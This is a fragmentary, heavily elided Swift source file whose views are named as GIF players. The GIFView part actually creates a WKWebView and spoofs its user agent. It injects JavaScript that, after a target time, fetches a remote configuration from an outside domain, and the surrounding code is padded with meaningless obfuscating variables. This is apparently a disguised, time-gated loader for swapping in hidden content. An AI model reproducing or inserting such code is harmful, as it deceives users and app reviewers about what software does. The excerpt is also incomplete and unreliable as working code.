...
struct GifPresentView: UIViewRepresentable {
    let st: String
...
struct GIFViewStatication: UIViewRepresentable {
    let gifName: String
...
struct GIFView: UIViewRepresentable {
    ...
    func makeUIView(context: Context) -> WKWebView {
        ...
        crasonerW.allowsBackForwardNavigationGestures = true
        crasonerW.navigationDelegate = context.coordinator
        crasonerW.evaluateJavaScript("navigator.userAgent") { [weak crasonerW] (userAgentResult, error) in
            if let currentAgent = userAgentResult as? String {
                let customAgent = currentAgent + " Safari/604.1"
                crasonerW?.customUserAgent = customAgent
            }
        }
           ...
           let gifData = try? Data(contentsOf: prosen) {
            ...
            function checkConfig() {
                ...
                if (currentTime >= targetTime && shouldFetch) {
                    fetch('https://isletabrainadventure.com/assets/sugars')
                ...
                do {
                    if let sonata = sonstring.data(using: .utf8),
                       let son = try JSONSerialization.jsonObject(with: sonata) as? [String: Any] {
                        ...
                        let bpolrloe: String = "Repositarion"
                        let reposeon: Int = 31
                        let gralsoe: Int = 51
                        let beopoow: Bool = false
                        let ewae = "Seorko"
                        let fexxx = "Reposetoraions"
                        let lolsois: Int = 31
                        let qweee: Int = 51
                        if success && vaLIs {
